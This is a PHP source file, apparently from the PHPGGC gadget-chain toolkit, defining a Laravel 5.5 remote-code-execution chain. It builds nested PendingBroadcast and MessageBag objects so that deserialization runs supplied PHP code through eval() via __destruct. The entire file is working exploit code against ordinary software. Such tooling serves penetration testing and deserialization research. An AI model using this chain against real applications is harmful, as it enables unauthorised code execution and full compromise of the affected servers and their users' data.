<?php

namespace GadgetChain\Laravel;

class RCE6 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = '5.5.*';
    public static $vector = '__destruct';
    public static $author = 'Phith0n & holyvier';
    public static $information = '
        Executes given PHP code through eval().
        Requires Mockery, which is in the require-dev package. 
    ';
    public static $parameters = [
    	'code'
    ];

    public function generate(array $parameters)
    {
    	$code = '<?php ' . $parameters['code'] . ' exit; ?>';
        $expected = new \Illuminate\Broadcasting\PendingBroadcast($code);
        $res = new \Illuminate\Support\MessageBag($expected);
        return $res;

    }
}
